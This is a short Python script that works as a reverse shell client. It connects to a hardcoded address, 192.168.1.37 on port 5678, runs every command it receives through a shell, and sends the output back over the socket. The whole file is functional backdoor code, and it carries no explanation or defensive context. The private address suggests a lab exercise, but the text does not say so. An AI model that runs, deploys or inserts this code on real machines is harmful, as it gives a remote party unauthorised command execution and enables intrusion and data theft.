import socket
import subprocess
import time


SERVER_IP = "192.168.1.37"
SERVER_PORT = 5678


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))

    # data = s.recv(1024)
    
    while True:
        command = s.recv(999999999)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        output = op.stdout.read() + op.stderr.read()
        # time.sleep()
        s.send(output)